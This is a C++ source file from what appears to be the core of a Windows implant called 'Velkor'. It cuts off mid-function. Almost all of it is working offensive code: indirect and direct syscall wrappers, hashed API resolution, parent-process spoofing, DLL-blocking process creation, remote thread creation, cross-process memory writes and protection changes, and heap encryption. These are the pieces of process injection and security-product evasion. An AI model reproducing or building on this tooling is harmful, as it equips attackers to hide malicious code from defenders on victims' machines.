#include <Velkor.h>
#include <Evasion.h>

ST_GLOBAL PVOID __gxx_personality_sj0   = 0;
ST_GLOBAL PVOID _Unwind_SjLj_Resume     = 0;
ST_GLOBAL PVOID _Unwind_SjLj_Unregister = 0;
ST_GLOBAL PVOID _Unwind_SjLj_Register   = 0;

namespace Ground {

    namespace Api {

        ST_GLOBAL MODULE_CACHE    ModuleCache[M_CACHE_SIZE]   = { 0 };
        ST_GLOBAL FUNCTION_CACHE  FunctionCache[F_CACHE_SIZE] = { 0 };

        D_SEC( B ) HMODULE GetCachedModule( ULONG ModuleHash ) {
            for ( INT i = 0; i < M_CACHE_SIZE; i++ ) {
                if ( ModuleCache[i].ModuleHash == ModuleHash ) {
                    return ModuleCache[i].Module;
                }
            }

            return NULL; 
        }

        D_SEC( B ) FARPROC GetCachedFunction( ULONG ModuleHash, ULONG FunctionHash ) {
            for ( INT i = 0; i < F_CACHE_SIZE; i++ ) {
                if ( 
                    FunctionCache[i].ModuleHash == ModuleHash &&
                    FunctionCache[i].FunctionHash == FunctionHash
                ) {
                    return FunctionCache[i].Function;
                }
            } 

            return NULL;
        }

        D_SEC( B ) BOOL CacheModule( ULONG ModuleHash, HMODULE Module ) {
            for ( INT i = 0; i < M_CACHE_SIZE; i++ ) {
                if ( ModuleCache[i].ModuleHash == 0 ) {  
                    ModuleCache[i].ModuleHash = ModuleHash;
                    ModuleCache[i].Module     = Module;
                    return TRUE;
                }
            }

            return FALSE;  
        }


        D_SEC( B ) BOOL CacheFunction( ULONG ModuleHash, ULONG FunctionHash, FARPROC Function ) {
            for ( INT i = 0; i < F_CACHE_SIZE; i++ ) {
                if ( 
                    FunctionCache[i].ModuleHash == 0 &&
                    FunctionCache[i].FunctionHash == 0
                ) {
                    FunctionCache[i].ModuleHash     = ModuleHash;
                    FunctionCache[i].FunctionHash   = FunctionHash;
                    FunctionCache[i].Function       = Function;
                    return TRUE;
                }
            }

            return NULL;
        }
    }

    namespace Process {

        D_SEC( B ) HANDLE Open( UINT32 AccessRights, BOOL bInheritHandle, UINT32 ProcessId ) {
            VELKOR_INSTANCE

            HANDLE            ProcessHandle = NULL;
            NTSTATUS          NtStatus      = STATUS_SUCCESS;
            CLIENT_ID         ClientId      = { 0 };
            OBJECT_ATTRIBUTES ObjectAttr    = { 0 };

            switch( SYSCALL_METHOD ) {
            case VkCallWinApi:
                ProcessHandle = VkCall<HANDLE>( XprKernel32, XPR( "OpenProcess" ), AccessRights, bInheritHandle, ProcessId ); break;
            case VkCallNtApi: case VkCallIndirect:
                ObjectAttr             = RTL_CONSTANT_OBJECT_ATTRIBUTES( NULL, 0 );
                ClientId.UniqueProcess = ULongToHandle( ProcessId );
                if ( SYSCALL_METHOD == VkCallIndirect ) {
                    NtStatus = VkSyscallExec( VkSys[eNtOpenProcess], &ProcessHandle, AccessRights, &ObjectAttr, &ClientId );
                } else {
                    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtOpenProcess" ), &ProcessHandle, AccessRights, &ObjectAttr, &ClientId ); 
                }

                SetNtStatusToSystemError( NtStatus ); break;
            }

            return ProcessHandle;            
        }

        D_SEC( B ) BOOL Kill( HANDLE ProcessHandle, UINT32 ExitCode ) {
            VELKOR_INSTANCE

            BOOL     bSuccess = FALSE;
            NTSTATUS NtStatus = STATUS_SUCCESS;

            switch( SYSCALL_METHOD ) {
            case VkCallWinApi:
                bSuccess = VkCall<BOOL>( XprKernel32, XPR( "TerminateProcess" ), ProcessHandle, ExitCode ); break;
            case VkCallNtApi: case VkCallIndirect:
                if ( SYSCALL_METHOD == VkCallIndirect ) {
                    NtStatus = VkSyscallExec( VkSys[eNtTerminateProcess], ProcessHandle, ExitCode );
                } else {
                    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtTerminateProcess" ), ProcessHandle, ExitCode );
                }
                
                SetNtStatusToSystemError( NtStatus );
                if ( NtStatus == STATUS_SUCCESS ) bSuccess = TRUE; break;
            }
            
            return bSuccess;
        }

        class ProcThreadAttributeList {
        private:
            LPPROC_THREAD_ATTRIBUTE_LIST AttributeBuff;
            UINT64                       AttributeSize;
        public:
            D_SEC( B ) ProcThreadAttributeList() : AttributeBuff( NULL ), AttributeSize( 0 ) {}
            
            D_SEC( B ) BOOL Initialize( UINT8 UpdateCount ) {
                VELKOR_INSTANCE

                VkCall<BOOL>( XprKernel32, XPR( "InitializeProcThreadAttributeList" ), NULL, UpdateCount, 0, &AttributeSize );

                AttributeBuff = (LPPROC_THREAD_ATTRIBUTE_LIST)VkMem::Heap::Alloc( AttributeSize );
                return VkCall<BOOL>( XprKernel32, XPR( "InitializeProcThreadAttributeList" ), AttributeBuff, UpdateCount, 0, &AttributeSize );
            }

            D_SEC( B ) BOOL UpdateParentSpf( UINT32 ParentProcessId ) {
                VELKOR_INSTANCE

                HANDLE ParentProcessHandle = VkProcess::Open( PROCESS_ALL_ACCESS, FALSE, ParentProcessId );
                return VkCall<BOOL>( XprKernel32, XPR( "UpdateProcThreadAttribute" ), AttributeBuff, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ParentProcessHandle, sizeof( HANDLE ), NULL, 0 );
            }

            D_SEC( B ) BOOL UpdateBlockDlls( VOID ) {
                VELKOR_INSTANCE
                
                UINT64 Policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
                return VkCall<BOOL>( XprKernel32, XPR( "UpdateProcThreadAttribute" ), AttributeBuff, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &Policy, sizeof( UINT64 ), NULL, 0 );
            }

            D_SEC( B ) ~ProcThreadAttributeList() {
                if ( AttributeBuff ) {                
                    VkMem::Heap::Free( AttributeBuff, AttributeSize );
                    VkCall<BOOL>( XprKernel32, XPR( "DeleteProcThreadAttributeList" ), AttributeBuff );
                }
            }

            D_SEC( B ) LPPROC_THREAD_ATTRIBUTE_LIST GetAttrBuff() const { return AttributeBuff; }
        };    

        D_SEC( B ) BOOL Create( PSTR Path, BOOL bInheritHandle, UINT32 Flags, PSTR CurrentDir, PPROCESS_INFORMATION ProcessInf, UINT32 ParentProcId, BOOL BlockDlls ) {
            VELKOR_INSTANCE
            ProcThreadAttributeList ProcAttr;

            BOOL           bSuccess            = FALSE;
            STARTUPINFOEXA SiExA               = { 0 };
            UINT8          UpdateCount         = 0;  
            HANDLE         ParentProcessHandle = NULL;

            if ( ParentProcId ) UpdateCount++;
            if ( BlockDlls    ) UpdateCount++;

            SiExA.StartupInfo.cb      = sizeof( STARTUPINFOEXA );
            SiExA.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;

            if ( UpdateCount  ) ProcAttr.Initialize( UpdateCount );
            if ( ParentProcId ) ProcAttr.UpdateParentSpf( ParentProcId );
            if ( BlockDlls    ) ProcAttr.UpdateBlockDlls();

            if ( ParentProcId || BlockDlls ) SiExA.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)ProcAttr.GetAttrBuff();

            bSuccess = VkCall<BOOL>( XprKernel32, XPR( "CreateProcessA" ), NULL, Path, NULL, NULL, bInheritHandle, Flags, NULL, CurrentDir, &SiExA.StartupInfo, ProcessInf );

            return bSuccess;
        }
    }

    namespace Thread {

        D_SEC( B ) HANDLE Create( SIZE_T StackSize, PVOID StartAddress, PVOID Parameter, ULONG Flags, PULONG ThreadIdPtr, HANDLE ProcessHandle ) {
            VELKOR_INSTANCE
            
            HANDLE    ThreadHandle = NULL;
            NTSTATUS  NtStatus     = STATUS_SUCCESS;
               
            switch( SYSCALL_METHOD ) {
            case VkCallWinApi:
                ThreadHandle = VkCall<HANDLE>( XprKernel32, XPR( "CreateRemoteThreadEx" ), ProcessHandle, NULL, StackSize, StartAddress, Parameter, Flags, NULL, ThreadIdPtr ); break;
            case VkCallNtApi: case VkCallIndirect:
                if ( SYSCALL_METHOD == VkCallIndirect ) {
                    NtStatus = VkSyscallExec( VkSys[eNtCreateThreadEx], &ThreadHandle, THREAD_ALL_ACCESS, 0, ProcessHandle, StartAddress, Parameter, Flags, 0, StackSize, StackSize, NULL ); 
                } else {
                    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtCreateThreadEx" ), &ThreadHandle, THREAD_ALL_ACCESS, 0, ProcessHandle, StartAddress, Parameter, Flags, 0, StackSize, StackSize, NULL ); 
                }
                
                if ( ThreadIdPtr ) C_DEF32( ThreadIdPtr ) = VkCall<ULONG>( XprKernel32, XPR( "GetThreadId" ), ThreadHandle ); 
                SetNtStatusToSystemError( NtStatus ); break;
            }

            return ThreadHandle;
        }

        D_SEC( B ) HANDLE Open( ULONG AccessRights, BOOL bInheritHandle, ULONG ThreadId ) {
            VELKOR_INSTANCE

            HANDLE   ThreadHandle = NULL;
            NTSTATUS NtStatus     = STATUS_SUCCESS;

            CLIENT_ID ClientId = { 0 };

            // switch( SYSCALL_METHOD ) {
            // case VkCallWinApi:
            ThreadHandle = VkCall<HANDLE>( XprKernel32, XPR( "OpenThread" ), AccessRights, bInheritHandle, ThreadId ); 

            return ThreadHandle;      
        }

        D_SEC( B ) ULONG Resume( HANDLE ThreadHandle ) {
            VELKOR_INSTANCE

            ULONG    SuspendCount = 0;
            NTSTATUS NtStatus     = STATUS_SUCCESS;

            switch( SYSCALL_METHOD ) {
            case VkCallWinApi:
                SuspendCount = VkCall<ULONG>( XprNtdll, XPR( "ResumeThread" ), ThreadHandle ); break;
            case VkCallNtApi: case VkCallIndirect:
                if ( SYSCALL_METHOD == VkCallIndirect ) {
                    NtStatus = VkSyscallExec( VkSys[eNtResumeThread], ThreadHandle, &SuspendCount );
                } else {
                    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtResumeThread" ), ThreadHandle, &SuspendCount );
                }
                
                SetNtStatusToSystemError( NtStatus );
                if ( NtStatus == STATUS_SUCCESS ) {
                    return SuspendCount;
                } else {
                    return -1;
                }
            }
            
            return SuspendCount;            
        }

        D_SEC( B ) BOOL Terminate( HANDLE ThreadHandle, ULONG ExitCode ) {
            VELKOR_INSTANCE

            BOOL     bSuccess = FALSE;
            NTSTATUS NtStatus = STATUS_SUCCESS;
            
            switch( SYSCALL_METHOD ) {
            case VkCallWinApi:
                bSuccess = VkCall<BOOL>( XprKernel32, XPR( "TerminateThread" ), ThreadHandle, ExitCode ); break;
            case VkCallNtApi: case VkCallIndirect:
                if ( SYSCALL_METHOD == VkCallIndirect ) {
                    NtStatus = VkSyscallExec( VkSys[eNtTerminateThread], ThreadHandle, ExitCode );
                } else {
                    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtTerminateThread" ), ThreadHandle, ExitCode );
                }
                SetNtStatusToSystemError( NtStatus );
                if ( NtStatus == STATUS_SUCCESS ) bSuccess = TRUE; break;
            }

            return bSuccess;
        }

        D_SEC( B ) ULONG RndEnum( VOID ) {
            VELKOR_INSTANCE

            PSYSTEM_PROCESS_INFORMATION SysProcInfo   = { 0 };
            PSYSTEM_THREAD_INFORMATION  SysThreadInfo = { 0 };
            PVOID                       ValToFree     = NULL;
            ULONG                       bkErrorCode   =  0;
            ULONG                       ReturnLen     = 0;
            ULONG                       RandomNumber  = 0;
            ULONG                       ThreadId      = 0;
            BOOL                        bkSuccess     = FALSE;

            VkCall<NTSTATUS>( XprNtdll, XPR( "NtQuerySystemInformation" ), SystemProcessInformation, NULL, NULL, &ReturnLen );

            SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)VkMem::Heap::Alloc( ReturnLen );
            ValToFree   = SysProcInfo;

            bkErrorCode = VkCall<NTSTATUS>( XprNtdll, XPR( "NtQuerySystemInformation" ), SystemProcessInformation, SysProcInfo, ReturnLen, &ReturnLen );
            if ( bkErrorCode ) goto _VK_END;

            SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_64( SysProcInfo ) + SysProcInfo->NextEntryOffset );

            while( 1 ) {
                if ( SysProcInfo->UniqueProcessId == UlongToHandle( Velkor->Session.ProcessId ) ) {
                    SysThreadInfo = SysProcInfo->Threads;

                    for ( INT i = 0; i < SysProcInfo->NumberOfThreads; i++ ) {
                        if ( HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ) != Velkor->Session.ThreadId ) {
                            ThreadId = HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ); goto _VK_END;
                        }
                    }
                }

                SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_64( SysProcInfo ) + SysProcInfo->NextEntryOffset );
            }

        _VK_END:
            if ( SysProcInfo ) VkMem::Heap::Free( ValToFree, sizeof( SYSTEM_PROCESS_INFORMATION ) );

            return ThreadId; 
        }
    }

    namespace Token {

        D_SEC( B ) BOOL Open( ULONG AccessRights, PHANDLE TokenHandle, eOPEN_TOKEN_TYPE TokenType, HANDLE TargetHandle ) {
            VELKOR_INSTANCE

            BOOL     bSuccess = FALSE;
            NTSTATUS NtStatus = STATUS_SUCCESS;

            if ( TokenType == VelkorTokenProcess ) {
                switch( SYSCALL_METHOD ) {
                case VkCallWinApi:
                    bSuccess = VkCall<BOOL>( XprKernel32, XPR( "OpenProcessToken" ), TargetHandle, AccessRights, TokenHandle ); break;
                case VkCallNtApi: case VkCallIndirect:
                    if ( SYSCALL_METHOD == VkCallIndirect ) {
                        NtStatus = VkSyscallExec( VkSys[eNtOpenProcessToken], TargetHandle, AccessRights, TokenHandle );
                    } else {
                        NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtOpenProcessToken" ), TargetHandle, AccessRights, TokenHandle );
                    }
                    
                    SetNtStatusToSystemError( NtStatus );
                    if ( NtStatus != STATUS_SUCCESS ) bSuccess = FALSE; break;
                }
            } 
            if ( TokenType == VelkorTokenThread ) {
                switch( SYSCALL_METHOD ) {
                case VkCallWinApi:
                    bSuccess = VkCall<BOOL>( XprKernel32, XPR( "OpenThreadToken" ), TargetHandle, AccessRights, ( TargetHandle == NtCurrentThread() ), TokenHandle ); break;
                case VkCallNtApi: case VkCallIndirect:
                    if ( SYSCALL_METHOD == VkCallIndirect ) {
                        NtStatus = VkSyscallExec( VkSys[eNtOpenThreadToken], TargetHandle, AccessRights, ( TargetHandle == NtCurrentThread() ), TokenHandle );
                    } else {
                        NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtOpenThreadToken" ), TargetHandle, AccessRights, ( TargetHandle == NtCurrentThread() ), TokenHandle );
                    }
                    
                    SetNtStatusToSystemError( NtStatus );
                    if ( NtStatus != STATUS_SUCCESS ) bSuccess = FALSE; break;
                }
            }

            return bSuccess;
        }

        D_SEC( B ) BOOL GetUser( PSTR *UserNamePtr, ULONG *UserNameLen, HANDLE TokenHandle ) {
            PTOKEN_USER  TokenUserPtr = { 0 };
            SID_NAME_USE SidName      = (SID_NAME_USE)0;
            NTSTATUS     NtStatus     = STATUS_SUCCESS;
            ULONG        TotalLen     = 0;
            ULONG        ReturnLen    = 0;
            PSTR         DomainStr    = NULL;
            ULONG        DomainLen    = 0;
            PSTR         UserStr      = NULL;
            ULONG        UserLen      = 0;
            BOOL         bSuccess     = FALSE;

            VkCall<NTSTATUS>( XprNtdll, XPR( "NtQueryInformationToken" ), TokenHandle, TokenUser, NULL, NULL, &ReturnLen );

            TokenUserPtr = (PTOKEN_USER)VkMem::Heap::Alloc( ReturnLen );

            NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtQueryInformationToken" ), TokenHandle, TokenUser, TokenUserPtr, ReturnLen, &ReturnLen );
            
            bSuccess = VkCall<BOOL>( XprAdvapi32, XPR( "LookupAccountSidA" ), NULL, TokenUserPtr->User.Sid, NULL, &UserLen, NULL, &DomainLen, &SidName );
            if ( !bSuccess ) {
                TotalLen = ( UserLen * sizeof( CHAR ) ) + ( DomainLen * sizeof( CHAR ) ) + sizeof( CHAR );

                *UserNamePtr = A_PTR( VkMem::Heap::Alloc( TotalLen ) );
                *UserNameLen = TotalLen;

                DomainStr = *UserNamePtr;
                UserStr   = (*UserNamePtr) + DomainLen;

                bSuccess = VkCall<BOOL>( XprAdvapi32, XPR( "LookupAccountSidA" ), NULL, TokenUserPtr->User.Sid, UserStr, &UserLen, DomainStr, &DomainLen, &SidName );
                if ( !bSuccess ) goto _VK_END;

                (*UserNamePtr)[DomainLen] = '\\';
            }
        _VK_END:
            if ( TokenUserPtr ) VkMem::Heap::Free( TokenUserPtr, ReturnLen );
            return bSuccess;
        }
    }

    namespace Memory {

        D_SEC( B ) PVOID Alloc( PVOID BaseAddress, SIZE_T AllocSize, ULONG AllocType, ULONG AllocProtection, HANDLE ProcessHandle ) {
            VELKOR_INSTANCE

            PVOID       BaseAddressIntern = NULL;
            NTSTATUS    NtStatus          = STATUS_SUCCESS;

            switch( SYSCALL_METHOD ) {
            case VkCallWinApi:
                BaseAddressIntern = VkCall<PVOID>( XprKernel32, XPR( "VirtualAllocEx" ), ProcessHandle, BaseAddress, AllocSize, AllocType, AllocProtection );
                AllocSize         = PAGE_ALIGN( AllocSize ) ; break;
            case VkCallNtApi: case VkCallIndirect:
                if ( SYSCALL_METHOD == VkCallIndirect ) {
                    NtStatus = VkSyscallExec( VkSys[eNtAllocateVirtualMemory], ProcessHandle, &BaseAddress, 0, &AllocSize, AllocType, AllocProtection );
                } else {
                    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtAllocateVirtualMemory" ), ProcessHandle, &BaseAddress, 0, &AllocSize, AllocType, AllocProtection );
                }

                SetNtStatusToSystemError( NtStatus );
                BaseAddressIntern = BaseAddress; break;
            }

            return BaseAddressIntern;
        }

        D_SEC( B ) BOOL Write( PVOID BaseAddress, PBYTE Buffer, SIZE_T BuffSize, PSIZE_T BytesWritten, HANDLE ProcessHandle ) {
            VELKOR_INSTANCE

            BOOL     bSuccess = FALSE;
            NTSTATUS NtStatus = STATUS_SUCCESS;

            switch( SYSCALL_METHOD ) {
            case VkCallWinApi:
                bSuccess = VkCall<BOOL>( XprKernel32, XPR( "WriteProcessMemory" ), ProcessHandle, BaseAddress, Buffer, BuffSize, BytesWritten ); break;
            case VkCallNtApi: case VkCallIndirect:
                if ( SYSCALL_METHOD == VkCallIndirect ) {
                    NtStatus = VkSyscallExec( VkSys[eNtWriteVirtualMemory], ProcessHandle, BaseAddress, Buffer, BuffSize, BytesWritten );
                } else {
                    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtWriteVirtualMemory" ), ProcessHandle, BaseAddress, Buffer, BuffSize, BytesWritten );
                }
                
                SetNtStatusToSystemError( NtStatus );
                if ( NtStatus == STATUS_SUCCESS ) bSuccess = TRUE; break;
            }

            return bSuccess;
        }

        D_SEC( B ) BOOL Protect( PVOID BaseAddress, SIZE_T RegionSize, ULONG NewProtection, PULONG OldProtection, HANDLE ProcessHandle ) {
            VELKOR_INSTANCE

            BOOL     bSuccess = FALSE;
            NTSTATUS NtStatus = STATUS_SUCCESS;

            switch( SYSCALL_METHOD ) {
            case VkCallWinApi:
                bSuccess = VkCall<BOOL>( XprKernel32, XPR( "VirtualProtectEx" ), ProcessHandle, BaseAddress, RegionSize, NewProtection, OldProtection ); break;
            case VkCallNtApi: case VkCallIndirect:
                if ( SYSCALL_METHOD == VkCallIndirect ) {
                    NtStatus = VkSyscallExec( VkSys[eNtProtectVirtualMemory], ProcessHandle, BaseAddress, RegionSize, NewProtection, OldProtection );
                } else {
                    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtProtectVirtualMemory" ), ProcessHandle, BaseAddress, RegionSize, NewProtection, OldProtection );
                }
                
                SetNtStatusToSystemError( NtStatus ); 
                if( NtStatus == STATUS_SUCCESS ) bSuccess = TRUE; ; break;
            }

            return bSuccess;
        }

        D_SEC( B ) SIZE_T Query( PVOID BaseAddress, PMEMORY_BASIC_INFORMATION MbiPtr, HANDLE ProcessHandle ) {
            VELKOR_INSTANCE

            SIZE_T   ReturnLength = 0;
            NTSTATUS NtStatus     = STATUS_SUCCESS;

            switch( SYSCALL_METHOD ) {
            case VkCallWinApi:
                ReturnLength = VkCall<SIZE_T>( XprKernel32, XPR( "VirtualQueryEx" ), ProcessHandle, BaseAddress, MbiPtr, sizeof( MEMORY_BASIC_INFORMATION ) ); break;
            case VkCallNtApi: case VkCallIndirect:
                if ( SYSCALL_METHOD == VkCallIndirect ) {
                    NtStatus = VkSyscallExec( VkSys[eNtQueryVirtualMemory], ProcessHandle, BaseAddress, MemoryBasicInformation, MbiPtr, sizeof( MEMORY_BASIC_INFORMATION ), &ReturnLength ); 
                } else {
                    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtQueryVirtualMemory" ), ProcessHandle, BaseAddress, MemoryBasicInformation, MbiPtr, sizeof( MEMORY_BASIC_INFORMATION ), &ReturnLength ); 
                }
                
                SetNtStatusToSystemError( NtStatus ); break;
            }

            return ReturnLength;
        }

        D_SEC( B ) BOOL Free( PVOID BaseAddress, SIZE_T SizeToFree, HANDLE ProcessHandle ) {
            VELKOR_INSTANCE

            BOOL     bSuccess = FALSE;
            NTSTATUS NtStatus = STATUS_SUCCESS;

            VkMem::Zero( BaseAddress, SizeToFree );

            switch( SYSCALL_METHOD ) {
            case VkCallWinApi:
               bSuccess = VkCall<BOOL>( XprKernel32, XPR( "VirtualFreeEx" ), ProcessHandle, BaseAddress, SizeToFree, MEM_RELEASE ); break;
            case VkCallNtApi: case VkCallIndirect:
                if ( SYSCALL_METHOD == VkCallIndirect ) {
                    NtStatus = VkSyscallExec( VkSys[eNtFreeVirtualMemory], ProcessHandle, &BaseAddress, &SizeToFree, MEM_RELEASE );
                } else {
                    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtFreeVirtualMemory" ), ProcessHandle, &BaseAddress, &SizeToFree, MEM_RELEASE );
                }
                
                SetNtStatusToSystemError( NtStatus );
                if ( NtStatus == STATUS_SUCCESS ) bSuccess = TRUE; break;
            }

            return bSuccess;
        }

        D_SEC( B ) PVOID Copy( PVOID Dest, const PVOID Src, SIZE_T Size ) {
            return __builtin_memcpy( Dest, Src, Size );
        }

        D_SEC( B ) VOID Zero( PVOID Ptr, SIZE_T Size ) {
            return __stosb( UC_PTR( Ptr ), 0, Size );
        }

        D_SEC( B ) VOID Set( PVOID Dest, UCHAR Value, SIZE_T Size ) {
            return __stosb( UC_PTR( Dest ), Value, Size );
        }
    
        namespace Heap {

            typedef struct _NODE {
                PVOID  Block;       
                SIZE_T Size;

                _NODE* Next;
            } NODE, *PNODE;

            ST_GLOBAL PNODE NodePtr = { 0 };

            D_SEC( B ) PNODE NodeHeadInsert( PNODE Head, PVOID Block, SIZE_T Size ) {
                
                PNODE NewNode = VkCall<PNODE>( 
                    XprNtdll, XPR( "RtlAllocateHeap" ), 
                    NtCurrentPeb()->ProcessHeap, 0, sizeof( NODE ) 
                );

                NewNode->Next  = Head;
                NewNode->Block = Block;
                NewNode->Size  = Size;

                return NewNode; 
            }

            D_SEC( B ) BOOL NodeReSizeBlock( PNODE Head, PVOID Block, SIZE_T Size ) {
                
                while( Head ) {
                    if ( Head->Block == Block ) {
                        Head->Size = Size;
                        return TRUE;
                    }

                    Head = Head->Next;
                }

                return FALSE;
            }

            D_SEC( B ) BOOL NodeRemoveBlock( PVOID Block, SIZE_T Size ) {
                
                PNODE Head = NodePtr;

                while( Head ) {
                    if ( Head->Block == Block ) {
                        VkMem::Zero( Head->Block, Head->Size );
                        return VkCall<BOOL>( XprNtdll, XPR( "RtlFreeHeap" ), NtCurrentPeb()->ProcessHeap, 0, Head->Block );
                    }
                    
                    Head = Head->Next;
                }

                return FALSE;
            }

            D_SEC( B ) VOID NodeDisplayAll( VOID ) {
                
                PNODE Head = NodePtr;
                
                while( Head ) {
                    VkCall<INT>( XprMsvcrt, XPR( "printf" ), "Block => 0x%p\nSize  => %d\n\n", Head->Block, Head->Size );
                    Head = Head->Next;
                }
            }

            D_SEC( B ) VOID HeapCrypt( PBYTE Key, ULONG KeySize ) {
                
                PNODE Head = NodePtr;

                while( Head ) {
                    XorCipher( B_PTR( Head->Block ), Head->Size, Key, KeySize );
                    Head = Head->Next;
                }

                return;
            }

            D_SEC( B ) PVOID Alloc( SIZE_T Size ) {

                PVOID Block = VkCall<PVOID>( XprNtdll, XPR( "RtlAllocateHeap" ), NtCurrentPeb()->ProcessHeap, 0, Size );    

                // NodePtr = NodeHeadInsert( NodePtr, Block, Size );

                // NodeDisplayAll();

                return Block;
            }

            D_SEC( B ) PVOID ReAlloc( PVOID Ptr, SIZE_T Size ) {

                PVOID ReallocatedBlock = VkCall<PVOID>( XprNtdll, XPR( "RtlReAllocateHeap" ), NtCurrentPeb()->ProcessHeap, 0, Ptr, Size );

                // NodeReSizeBlock( NodePtr, ReallocatedBlock, Size );

                return ReallocatedBlock;
            }

            D_SEC( B ) BOOL Free( PVOID Ptr, SIZE_T Size ) {
                VELKOR_INSTANCE

                VkMem::Zero( static_cast<PBYTE>( Ptr ), Size );
                BOOL bSuccess = VkCall<BOOL>( XprNtdll, XPR( "RtlFreeHeap" ), NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, Ptr );

                // NodeRemoveBlock( Ptr, Size );

                return bSuccess;
            }
        }
    }

    namespace String {
        
        D_SEC( B ) SIZE_T WCharToChar( PCHAR Dest, PWCHAR Src, SIZE_T MaxAllowed ) {
            SIZE_T Length = MaxAllowed;
            while (--Length > 0) {
                if (!(*Dest++ = static_cast<CHAR>(*Src++))) {
                    return MaxAllowed - Length - 1;
                }
            }
            return MaxAllowed - Length;
        }

        D_SEC( B ) SIZE_T CharToWChar( PWCHAR Dest, PCHAR Src, SIZE_T MaxAllowed ) {
            SIZE_T Length = MaxAllowed;
            while ( --Length > 0 ) {
                if ( !( *Dest++ = static_cast<WCHAR>( *Src++ ) ) ) {
                    return MaxAllowed - Length - 1;
                }
            }
            return MaxAllowed - Length;
        }

        D_SEC( B ) SIZE_T LengthA( LPCSTR String ) {
            LPCSTR End = String;
            while (*End) ++End;
            return End - String;
        }

        D_SEC( B ) SIZE_T LengthW( LPCWSTR String ) {
            LPCWSTR End = String;
            while (*End) ++End;
            return End - String;
        }

        D_SEC( B ) INT CompareCountA( PCSTR Str1, PCSTR Str2, INT16 Count ) {
            INT16 Idx = 0;

            while (*Str1 && (*Str1 == *Str2) && Idx == Count ) {
                ++Str1;
                ++Str2;

                Idx++;
            }
            return static_cast<INT>(*Str1) - static_cast<INT>(*Str2);
        }

        D_SEC( B ) INT CompareA( LPCSTR Str1, LPCSTR Str2 ) {
            while (*Str1 && (*Str1 == *Str2)) {
                ++Str1;
                ++Str2;
            }
            return static_cast<INT>(*Str1) - static_cast<INT>(*Str2);
        }

        D_SEC( B ) INT CompareW( LPCWSTR Str1, LPCWSTR Str2 ) {
            while ( *Str1 && ( *Str1 == *Str2 ) ) {
                ++Str1;
                ++Str2;
            }
            return static_cast<INT>( *Str1 ) - static_cast<INT>( *Str2 );
        }

        D_SEC( B ) void ToUpperCaseChar(char* str) {
            while (*str) {
                if (*str >= 'a' && *str <= 'z') {
                    *str = *str - ('a' - 'A');
                }
                str++;
            }
        }

        D_SEC( B ) void ToLowerCaseChar( PCHAR Str ) {
            while (*Str) {
                if (*Str >= 'A' && *Str <= 'Z') {
                    *Str += ('a' - 'A');
                }
                ++Str;
            }
        }

        D_SEC( B ) WCHAR ToLowerCaseWchar( WCHAR Ch ) {
            return (Ch >= L'A' && Ch <= L'Z') ? Ch + (L'a' - L'A') : Ch;
        }

        D_SEC( B ) PCHAR CopyA( PCHAR Dest, LPCSTR Src ) {
            PCHAR p = Dest;
            while ((*p++ = *Src++));
            return Dest;
        }

        D_SEC( B ) PWCHAR CopyW( PWCHAR Dest, LPCWSTR Src ) {
            PWCHAR p = Dest;
            while ( ( *p++ = *Src++ ) );
            return Dest;
        }

        D_SEC( B ) void ConcatA( PCHAR Dest, LPCSTR Src ) {
            CopyA( Dest + LengthA(Dest), Src );
        }

        D_SEC( B ) void ConcatW( PWCHAR Dest, LPCWSTR Src ) {
            CopyW( Dest + LengthW(Dest), Src );
        }

        D_SEC( B ) BOOL IsStringEqual( LPCWSTR Str1, LPCWSTR Str2 ) {
            WCHAR TempStr1[MAX_PATH], TempStr2[MAX_PATH];
            SIZE_T Length1 = LengthW( Str1 );
            SIZE_T Length2 = LengthW( Str2 );

            if ( Length1 >= MAX_PATH || Length2 >= MAX_PATH ) return FALSE;

            for (SIZE_T i = 0; i < Length1; ++i) {
                TempStr1[i] = ToLowerCaseWchar( Str1[i] );
            }
            TempStr1[Length1] = L'\0';

            for (SIZE_T j = 0; j < Length2; ++j) {
                TempStr2[j] = ToLowerCaseWchar( Str2[j] );
            }
            TempStr2[Length2] = L'\0';

            return CompareW( TempStr1, TempStr2 ) == 0;
        }

        D_SEC( B ) VOID InitUnicode( PUNICODE_STRING UnicodeString, PWSTR Buffer ) {
            if (Buffer) {
                SIZE_T Length = LengthW(Buffer) * sizeof(WCHAR);
                if (Length > 0xFFFC) Length = 0xFFFC;

                UnicodeString->Buffer = const_cast<PWSTR>(Buffer);
                UnicodeString->Length = static_cast<USHORT>(Length);
                UnicodeString->MaximumLength = static_cast<USHORT>(Length + sizeof(WCHAR));
            } else {
                UnicodeString->Buffer = nullptr;
                UnicodeString->Length = 0;
                UnicodeString->MaximumLength = 0;
            }
        }

        D_SEC( B ) PSTR GenerateRndStr( ULONG StringSize ) {
            CHAR  Words[]    = "abcdefghijklmnopqrstuvwxyz0123456789";
            ULONG WordsLen   = VkStr::LengthA( Words );
            ULONG Count      = 0;
            PSTR  RndString  = A_PTR( VkMem::Heap::Alloc( StringSize ) );

            for ( INT i = 0; i < StringSize; i++ ) {
                ULONG Count  = ( Random32() % WordsLen );
